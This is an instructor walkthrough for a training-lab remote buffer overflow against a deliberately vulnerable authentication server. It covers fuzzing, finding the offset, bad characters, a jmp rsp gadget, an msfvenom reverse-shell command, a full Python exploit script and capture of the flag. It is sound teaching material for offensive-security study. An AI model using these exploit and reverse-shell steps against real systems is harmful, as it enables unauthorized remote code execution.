# Instructor Walkthrough: Lab 04 (OSCP-style Remote Buffer Overflow)

This document provides a detailed walkthrough of exactly how a student solves the OSCP-style buffer overflow on the VaultTech Authentication Server.

---

## 1. Reconnaissance & Fuzzing
The student discovers port 9999 is open. Connecting via netcat reveals:
```text
Welcome to VaultTech Authentication Server v1.0
Commands: AUTH <password>
>
```

They write a fuzzer script to send incrementally larger strings to `AUTH `.
The server will crash when sending approximately 600 bytes.

## 2. Finding the Offset
The student uses `msf-pattern_create -l 800` (or `pwntools` cyclic) to generate a unique string.
They send this string as the password, and check the core dump or `gdb` output to see what value overwrote the `RIP` register.
```bash
# E.g., RIP is overwritten with 0x... (which corresponds to 'j9AA' in the pattern)
msf-pattern_offset -q [value]
```
Depending on the exact GCC compilation, the offset will typically be exactly **520 bytes** (512 for the buffer + 8 for the saved base pointer).

## 3. Bad Character Analysis
The student generates a byte array from `\x01` to `\xff` and sends it after the 520 'A's. 
By inspecting the memory in `gdb`, they will see that the payload gets truncated at certain characters. 

The custom `filter_bad_chars()` function in the source code specifically filters:
- `\x00` (Null Byte - inherent to `strcpy`)
- `\x0a` (Newline)
- `\x0d` (Carriage Return)
- `\x2b` (Plus Sign `+` - artificially added to force encoding)

## 4. Finding a JMP RSP Gadget
The student needs to redirect execution to their shellcode on the stack. They use `objdump` or `ropper` to find a `jmp rsp` (or `call rsp`) instruction in the binary:
```bash
objdump -d /srv/labs/lab04/bin/vault_server | grep -i 'jmp.*%rsp'
```
*Expected Output:* `40058a: ff e4  jmp *%rsp`
(The exact address may vary slightly, e.g., `0x40058a`).

## 5. Generating Shellcode
The student uses `msfvenom` to generate a reverse shell, making sure to avoid the discovered bad characters (`\x00\x0a\x0d\x2b`):
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<student_ip> LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python -v shellcode
```

## 6. The Final Exploit Script
The student writes the final Python 3 exploit.

```python
import socket
import struct

target_ip = "127.0.0.1"
target_port = 9999

# The exact offset found via cyclic pattern
offset = 520

# Address of "jmp rsp" gadget (found via objdump)
# IMPORTANT: Convert to little-endian
jmp_rsp = struct.pack('<Q', 0x40058a) 

# Payload generated by msfvenom (example)
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
# ... (rest of msfvenom payload) ...

# Construct the malicious payload
payload = b"AUTH " 
payload += b"A" * offset 
payload += jmp_rsp 
payload += b"\x90" * 32     # NOP Sled (very important for encoded shellcode)
payload += shellcode

print(f"[+] Sending malicious payload to {target_ip}:{target_port}...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
print("[+] Payload sent. Check your netcat listener!")
```

## 7. Privilege Escalation
Before running the exploit script, the student starts a netcat listener: `nc -lvnp 4444`.
When the script is executed, the server crashes, but because the payload redirects the CPU to the stack, the shellcode executes!
The student receives a reverse shell. Since `vault_server` runs as a `systemd` service under the `lab04` user, the shell has `lab04` privileges. 

The student simply runs:
```bash
cat /etc/lab04_flag
```
And retrieves the flag: `FLAG{...}`.
